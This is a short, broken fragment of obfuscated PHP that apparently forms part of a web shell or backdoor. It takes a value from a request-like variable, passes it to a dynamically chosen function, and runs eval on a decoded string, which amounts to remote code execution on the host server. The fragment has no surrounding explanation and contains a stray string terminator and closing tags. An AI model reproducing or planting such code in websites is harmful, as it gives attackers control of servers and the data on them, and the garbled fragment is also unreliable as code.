$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>